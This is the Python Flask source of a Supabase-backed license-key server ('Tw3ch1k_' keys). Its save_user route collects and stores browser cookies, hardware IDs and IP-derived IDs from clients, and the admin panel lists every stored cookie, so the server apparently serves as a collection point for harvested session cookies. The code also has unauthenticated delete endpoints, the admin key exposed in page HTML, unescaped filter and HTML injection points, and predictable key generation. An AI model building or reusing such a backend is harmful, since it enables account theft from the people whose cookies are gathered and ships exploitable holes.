import os
import base64
import random
import requests
from dotenv import load_dotenv
from datetime import datetime, timedelta, timezone
from flask import Flask, request, jsonify, send_from_directory, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Load .env
load_dotenv("/etc/secrets/.env")

# Flask init
app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["20 per minute"])

# Supabase config
SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_KEY')
SUPABASE_HEADERS = {
    'apikey': SUPABASE_KEY,
    'Authorization': f'Bearer {SUPABASE_KEY}',
    'Content-Type': 'application/json'
}
ADMIN_KEY = os.getenv("ADMIN_KEY")

# === KEY GENERATION ===
def generate_key(length=16):
    CUSTOM_LETTERS = 'oasuxclO'
    CUSTOM_DIGITS = '68901'
    digits_count = int(length * 0.7)
    letters_count = length - digits_count
    key_chars = random.choices(CUSTOM_DIGITS, k=digits_count) + random.choices(CUSTOM_LETTERS, k=letters_count)
    random.shuffle(key_chars)
    key = ''.join(key_chars)
    return f"Tw3ch1k_" + '-'.join([key[i:i+4] for i in range(0, len(key), 4)])

def save_key(key=None):
    key = key or generate_key()
    created_at = datetime.utcnow().isoformat()
    data = {"key": key, "created_at": created_at, "used": False}
    res = requests.post(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS, json=data)
    if res.status_code == 201:
        return key
    return None

def get_user_id(ip, hwid):
    return base64.b64encode(f"{ip}_{hwid}".encode()).decode()

# === ROUTES ===
@app.route('/api/clean_old_keys', methods=['POST'])
def clean_old_keys():
    data = request.get_json()
    if not data or data.get("admin") != ADMIN_KEY:
        return jsonify({"error": "Access denied"}), 403

    res = requests.get(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS)
    if res.status_code != 200:
        return jsonify({"error": "Failed to fetch keys", "details": res.text}), 500

    keys = res.json()
    now = datetime.now(timezone.utc)
    deleted = 0

    for key in keys:
        created_at_str = key.get("created_at")
        if not created_at_str:
            continue
        try:
            created_at = datetime.fromisoformat(created_at_str.replace("Z", "+00:00"))
        except Exception:
            continue

        if now - created_at > timedelta(hours=24):
            delete = requests.delete(
                f"{SUPABASE_URL}/rest/v1/keys?id=eq.{key['key']}",
                headers=SUPABASE_HEADERS
            )
            if delete.status_code == 204:
                deleted += 1

    return jsonify({"message": f"🧹 Удалено ключей: {deleted}"})
@app.route('/api/get_key')
@limiter.limit("10/minute")
def get_key():
    key = save_key()
    if not key:
        return jsonify({"error": "Failed to save key"}), 500
    return jsonify({"key": key})

@app.route('/api/verify_key')
@limiter.limit("20/minute")
def verify_key():
    key = request.args.get('key')
    if not key:
        return "invalid", 200, {'Content-Type': 'text/plain'}

    res = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS)
    if res.status_code != 200 or not res.json():
        return "invalid", 200, {'Content-Type': 'text/plain'}

    key_data = res.json()[0]
    if key_data["used"]:
        return "used", 200, {'Content-Type': 'text/plain'}

    created_at = datetime.fromisoformat(key_data["created_at"].replace("Z", "+00:00"))
    if datetime.now(timezone.utc) - created_at > timedelta(hours=24):
        return "expired", 200, {'Content-Type': 'text/plain'}

    update = requests.patch(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}",
                            headers=SUPABASE_HEADERS, json={"used": True})
    if update.status_code == 204:
        return "valid", 200, {'Content-Type': 'text/plain'}
    else:
        return "error", 500, {'Content-Type': 'text/plain'}

@app.route('/api/save_user', methods=['POST'])
@limiter.limit("5/minute")
def save_user():
    data = request.json
    ip = request.remote_addr or 'unknown_ip'
    cookies = data.get('cookies', '')
    hwid = data.get('hwid', '')
    key = data.get('key', '')
    if not hwid:
        return jsonify({"error": "Missing HWID"}), 400

    user_id = get_user_id(ip, hwid)

    user_check = requests.get(f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{user_id}", headers=SUPABASE_HEADERS)
    if user_check.status_code != 200:
        return jsonify({"error": "Failed to query user"}), 500

    users = user_check.json()
    if users:
        return jsonify({
            "status": "exists",
            "key": users[0]["key"],
            "registered_at": users[0]["registered_at"]
        })

    # Проверка или генерация ключа
    if key:
        key_check = requests.get(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS)
        if key_check.status_code != 200 or not key_check.json():
            key = save_key()
    else:
        key = save_key()
    if not key:
        return jsonify({"error": "Failed to save key"}), 500

    registered_at = datetime.utcnow().isoformat()
    user_data = {
        "user_id": user_id,
        "cookies": cookies,
        "hwid": hwid,
        "key": key,
        "registered_at": registered_at
    }
    user_res = requests.post(f"{SUPABASE_URL}/rest/v1/users", headers=SUPABASE_HEADERS, json=user_data)
    if user_res.status_code != 201:
        return jsonify({"error": "Failed to save user"}), 500
    return jsonify({
        "status": "saved",
        "key": key,
        "registered_at": registered_at
    })

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/style.css')
def serve_css():
    return send_from_directory('.', 'style.css')

@app.route('/user/admin')
def admin_panel():
    access_key = request.args.get('d')
    if access_key != ADMIN_KEY:
        return "Access denied", 403

    keys = requests.get(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS).json()
    users = requests.get(f"{SUPABASE_URL}/rest/v1/users", headers=SUPABASE_HEADERS).json()

    html = """<html><head><title>Admin Panel</title><style>
        body { font-family: monospace; background: #121212; color: #eee; padding: 20px; }
        table { border-collapse: collapse; width: 100%; margin-bottom: 20px; }
        th, td { border: 1px solid #666; padding: 8px; }
        th { background: #222; }
        button { background: #f33; color: white; border: none; padding: 4px 8px; cursor: pointer; }
    </style><script>
        async function del(url, payload) {
            const res = await fetch(url, {
                method: "POST",
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            alert(await res.text());
            location.reload();
        }
    </script></head><body>
    <h1>🔑 Keys</h1>
    <h2>🧹 Очистка</h2>
<button onclick="del('/api/clean_old_keys', {admin: '""" + ADMIN_KEY + """' })">Удалить ключи старше 24ч</button><table><tr><th>Key</th><th>Used</th><th>Created At</th><th>Action</th></tr>"""
    for k in keys:
        html += f"<tr><td>{k['key']}</td><td>{k['used']}</td><td>{k['created_at']}</td><td><button onclick=\"del('/api/delete_key', {{key: '{k['key']}'}})\">Delete</button></td></tr>"
    html += "</table><h1>👤 Users</h1><table><tr><th>User ID</th><th>HWID</th><th>Cookies</th><th>Key</th><th>Registered At</th><th>Action</th></tr>"
    for u in users:
        html += f"<tr><td>{u['user_id']}</td><td>{u['hwid']}</td><td>{u['cookies']}</td><td>{u['key']}</td><td>{u['registered_at']}</td><td><button onclick=\"del('/api/delete_user', {{user_id: '{u['user_id']}'}})\">Delete</button></td></tr>"
    html += "</table></body></html>"
    return html

@app.route('/api/delete_key', methods=['POST'])
def delete_key():
    data = request.get_json()
    key = data.get('key')
    if not key:
        return "Missing key", 400
    res = requests.delete(f"{SUPABASE_URL}/rest/v1/keys?key=eq.{key}", headers=SUPABASE_HEADERS)
    return "Key deleted" if res.status_code == 204 else f"Failed to delete: {res.text}", 500

@app.route('/api/delete_user', methods=['POST'])
def delete_user():
    data = request.get_json()
    user_id = data.get('user_id')
    if not user_id:
        return "Missing user_id", 400
    res = requests.delete(f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{user_id}", headers=SUPABASE_HEADERS)
    return "User deleted" if res.status_code == 204 else f"Failed to delete: {res.text}", 500

# === RUN ===
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
